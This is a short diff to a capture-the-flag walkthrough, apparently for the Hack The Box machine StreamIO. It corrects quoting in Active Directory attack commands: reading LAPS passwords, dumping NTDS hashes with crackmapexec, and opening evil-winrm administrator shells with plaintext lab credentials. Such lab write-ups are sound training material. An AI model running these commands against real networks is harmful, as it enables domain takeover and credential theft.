@@ -58,9 +58,9 @@ net group 'CORE STAFF'
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
 evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
-crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
-crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
-evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md')
+crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
+crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
+evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
 ```
 
 
